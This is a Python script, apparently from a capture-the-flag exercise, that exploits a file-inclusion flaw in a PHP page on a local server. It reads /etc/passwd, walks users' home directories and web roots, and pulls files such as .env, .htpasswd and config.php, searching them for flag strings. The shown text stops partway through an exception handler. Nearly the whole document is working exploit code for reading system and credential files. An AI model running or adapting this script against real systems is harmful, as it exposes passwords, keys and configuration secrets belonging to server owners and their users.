import requests
import re

target_url = "http://127.0.0.1:33001/private.php"

# Check what users exist from /etc/passwd and their home directories
print("[*] First, examining /etc/passwd for user home directories")
resp = requests.get(target_url, params={"file": "/etc/passwd"}, timeout=5)

# Extract usernames and home directories
passwd_pattern = r'^([a-zA-Z0-9_-]+):[^:]+:[^:]+:[^:]+:([^:]*):([^:]+):'
passwd_content = resp.text.split('<pre>')[1].split('</pre>')[0] if '<pre>' in resp.text else ""

users = []
for line in passwd_content.strip().split('\n'):
    if ':' in line:
        parts = line.split(':')
        if len(parts) >= 6:
            username = parts[0]
            home_dir = parts[5]
            users.append((username, home_dir))

print(f"[*] Found {len(users)} users:")
for username, home_dir in users:
    print(f"    {username}: {home_dir}")

# Check home directories for files
print("\n[*] Checking home directories for flag files")
for username, home_dir in users:
    if home_dir and home_dir.startswith('/'):
        # Try various flag names in home directory
        flag_names = ['flag', 'flag.txt', '.flag', 'FLAG', 'secret', 'secret.txt']
        for flag_name in flag_names:
            path = f"{home_dir}/{flag_name}"
            try:
                resp = requests.get(target_url, params={"file": path}, timeout=5)
                if '<pre>' in resp.text and 'Content of' in resp.text:
                    content = resp.text.split('<pre>')[1].split('</pre>')[0] if '<pre>' in resp.text else ""
                    if content.strip() and len(content.strip()) > 0:
                        print(f"\n[+] File found: {path}")
                        print(f"    Content: {content[:500]}")
                        if re.search(r'FLAG\{[^}]+\}', content):
                            print(f"    [!] FLAG FOUND: {re.search(r'FLAG\{[^}]+\}', content).group()}")
            except:
                pass

# Check common web directories
print("\n[*] Checking web directories for files")
web_paths = [
    "/var/www/html/",
    "/var/www/",
    "/app/",
    "/srv/www/",
    "/usr/share/nginx/html/",
]

potential_files = [
    "config.php", ".env", ".htaccess", ".htpasswd", "config.json", "database.php",
    "secret.php", "secrets.php", "config.inc.php", "settings.php"
]

for base_path in web_paths:
    for filename in potential_files:
        full_path = f"{base_path}{filename}"
        try:
            resp = requests.get(target_url, params={"file": full_path}, timeout=5)
            if '<pre>' in resp.text and 'Content of' in resp.text:
                content = resp.text.split('<pre>')[1].split('</pre>')[0] if '<pre>' in resp.text else ""
                if content.strip():
                    print(f"\n[+] File found: {full_path}")
                    print(f"    Content size: {len(content)}")
                    if re.search(r'FLAG\{[^}]+\}', content):
                        print(f"    [!] FLAG FOUND: {re.search(r'FLAG\{[^}]+\}', content).group()}")
        except:
            pass

# Check for files starting with . (hidden files)
print("\n[*] Checking for hidden files")
hidden_paths = [
    "/.flag",
    "/root/.flag",
    "/var/www/.flag",
    "/var/www/html/.flag",
    "/.secret",
    "/.hidden",
]

for path in hidden_paths:
    try:
        resp = requests.get(target_url, params={"file": path}, timeout=5)
        if '<pre>' in resp.text and 'Content of' in resp.text:
            content = resp.text.split('<pre>')[1].split('</pre>')[0] if '<pre>' in resp.text else ""
            if content.strip():
                print(f"\n[+] Hidden file found: {path}")
                print(f"    Content: {content[:300]}")
                if re.search(r'FLAG\{[^}]+\}', content):
                    print(f"    [!] FLAG FOUND: {re.search(r'FLAG\{[^}]+\}', content).group()}")
    except:
